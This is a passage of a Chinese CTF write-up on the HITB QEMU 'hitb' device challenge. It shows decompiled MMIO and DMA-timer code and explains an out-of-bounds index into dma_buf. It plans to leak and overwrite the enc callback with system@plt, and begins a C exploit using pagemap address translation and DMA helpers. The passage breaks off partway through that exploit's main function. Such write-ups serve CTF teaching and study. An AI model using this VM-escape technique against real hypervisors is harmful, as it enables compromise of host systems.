class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) == <span class="number">0</span> || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">140</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;dma_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">132</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">136</span> &amp;&amp; (opaque-&gt;dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (val &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; (opaque-&gt;status &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样需要满足<code>size == 4</code>，并且在部分操作还需要满足<code>(opaque-&gt;dma.cmd &amp; 1) == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *cnt_low; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  cmd = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( (cmd &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (cmd &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (cmd &amp; <span class="number">4</span>) != <span class="number">0</span> )                     <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        opaque-&gt;enc(v7, opaque-&gt;dma.cnt);</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 3</span></span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">-36</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst - <span class="number">2824</span>;</span><br><span class="line">      LODWORD(cnt_low) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">3000</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cnt_low = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        opaque-&gt;enc((<span class="keyword">char</span> *)v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)cnt_low);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = v4 &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)cnt_low);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是回调函数了，在上面的<code>hitb_mmio_write</code>函数中，当满足<code>if ( addr == 0x98 &amp;&amp; (val &amp; 1) != 0 &amp;&amp; (opaque-&gt;dma.cmd &amp; 1) == 0 )</code>就会调用了。而在这个函数中存在这样一个函数<code>cpu_physical_memory_rw</code>，这个函数在我翻看手册的时候还发现了其他类似的函数<code>cpu_physical_memory_read</code>、<code>cpu_physical_memory_write</code>所以可以猜测得到这个函数到底是干什么的。这个函数就是用于传递内容在物理地址和虚拟地址之间。<code>cpu_physical_memory_rw</code>函数的第一个参数时物理地址，虚拟地址需要通过读取/proc/$pid/pagemap转换为物理地址。</p><ol><li> dma.cmd==7时，idx=dma.src-0x40000，addr = dma_buf[idx]，调用enc加密函数加密，并写入到dma.dst中</li><li> dma.cmd==3时，idx=dma.src-0x40000，addr = dma_buf[idx]，写入到dma.dst中</li><li> dma.cmd==1时，idx=dma.dst-0x40000,addr=dma_buf[idx]，将其写入到dma.src中（第二个参数可以通过调试得到其地址就是dma_buf[dma.dst-0x40000]</li></ol><p>这个程序的作用就显而易见，这里实现的是一个dma机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。</p><p>即首先通过访问mmio地址与值（addr与value），在<code>hitb_mmio_write</code>函数中设置好dma中的相关值（src、dst以及cmd)。当需要dma传输数据时，设置addr为152，就会触发时钟中断，由另一个线程去处理时钟中断。时钟中断调用<code>hitb_dma_timer</code>，该函数根据<code>dma.cmd</code>的不同调用<code>cpu_physical_memory_rw</code>函数将数据从物理地址拷贝到<code>dma_buf</code>中或从<code>dma_buf</code>拷贝到物理地址中。</p><h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>接下来就是分析程序的漏洞了，这里的漏洞是非常明显的位于<code>hitb_dma_timer</code>函数中，其中的v2是没有做任何边界检查的，存在明显的溢出漏洞。</p><p>并且在上述找到的结构体看到了，他的<code>dma_buf</code>的大小只有4096，并且下方紧接着就是enc。而我们都知道enc存放的是回调函数，所以这里的利用思路就是，通过溢出泄漏出enc中存放的函数地址，紧接着修改其中的函数为<code>system@plt</code>，最后在<code>dma_buf</code>中写入<code>cat flag\x00</code>即可获取flag。</p><p><strong>exp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMABASE 0x40000</span></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_src</span><span class="params">(<span class="keyword">uint32_t</span> src_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>, src_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, dst_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_set_src(phy_userbuf);</span><br><span class="line">    dma_set_dst(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line">    dma_do_cmd(<span class="number">0</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_read</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dma_set_dst(phy_userbuf);</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">2</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_enc</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">1</span> | <span class="number">4</span> | <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span 